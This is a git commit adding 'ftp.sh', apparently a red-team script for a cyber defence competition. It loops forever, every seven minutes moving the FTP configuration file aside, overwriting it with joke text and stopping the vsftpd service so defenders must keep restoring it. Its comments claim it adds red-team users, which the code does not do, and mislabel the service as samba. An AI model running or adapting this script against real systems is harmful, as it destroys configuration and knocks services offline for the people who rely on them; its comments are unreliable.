97d388d7a593b5faaa58c9c6a7d38a1d7d01b4ad
mattr555-r <64177813+mattr555-r@users.noreply.github.com>
2023-04-12 15:12:27 -0400

    Create ftp.sh

---
+++ ftp.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+
+# Loop forever
+while true
+do
+ #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
+ sleep 420
+
+ #Generate random number, check if the number is even or odd
+ if [ $(( $RANDOM % 2)) -eq 0 ]
+ then
+ #Copy config file to other location, then overwrite original, add users for red team access
+   cp '/etc/ssl/ftpc/ftpc.conf' '/etc/mm.conf'
+   echo "I'm Batman" > '/etc/ssl/ftpc/ftpc.conf'
+ else
+ #Copy config file to other location, then overwrite original, add users for red team access
+   cp '/etc/ssl/ftpc/ftpc.conf' '/home/mm.conf'
+   echo "You ever dance with the devil in the pale mooon light?" > '/etc/ssl/ftpc/ftpc.conf'
+ fi
+ #Stop samba service
+ sudo service vsftpd stop
+done
